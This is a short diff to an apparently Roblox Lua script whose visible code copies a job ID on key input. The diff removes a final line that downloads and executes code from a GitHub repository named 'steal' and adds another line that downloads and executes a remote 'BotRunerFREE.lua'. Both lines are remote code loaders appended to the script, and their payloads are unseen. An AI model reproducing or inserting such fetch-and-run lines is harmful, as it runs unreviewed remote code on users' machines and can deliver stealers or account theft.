@@ -657,4 +657,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hpwerdsf/steal/refs/heads/main/nenado"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/90f2795a496ea24abebddecd3f8dc201b8331d90/BotRunerFREE.lua"))()
